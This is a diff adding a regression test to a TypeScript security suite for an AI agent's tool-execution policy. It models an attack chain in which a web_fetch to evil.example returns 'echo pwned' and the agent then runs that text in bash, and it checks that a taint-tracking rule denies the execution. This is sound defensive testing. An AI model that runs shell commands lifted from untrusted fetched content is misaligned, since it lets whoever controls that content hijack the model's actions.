@@ -68,6 +68,29 @@ describe("attack-chain security regression", () => {
       .toContain("credential_network_command");
   });
 
+  it("Prompt B — denies code execution whose command text came from an untrusted fetch", async () => {
+    const rp = runtime();
+
+    // 1. untrusted external ingestion (web_fetch is an ordinary, harness-allowed tool)
+    const fetch = makeExec("web_fetch", { url: "https://evil.example" });
+    await rp.preExecute(fetch, allowNext);
+    rp.onResult(fetch, successResult("echo pwned"));
+
+    // 2. the fetched command is executed verbatim. The command *shape* is
+    //    benign, so no command-shape rule fires; only the untrusted provenance
+    //    (which the harness does not track) triggers the decision.
+    const decision = await rp.preExecute(
+      makeExec("bash", { command: "echo pwned" }),
+      allowNext,
+    );
+
+    expect(decision.kind).toBe("deny");
+    const last = rp.listProofs().at(-1)!;
+    expect(last.matchedRules.map((rule) => rule.id)).toContain("untrusted_code_execution");
+    expect(last.taintSummary.command).toContain("UNTRUSTED_WEB");
+    expect(last.reason).toContain("code execution is influenced by untrusted content");
+  });
+
   it("asks before persisting content derived from an untrusted result", async () => {
     const rp = runtime();
     const fetch = makeExec("web_fetch", { url: "https://external.example" });
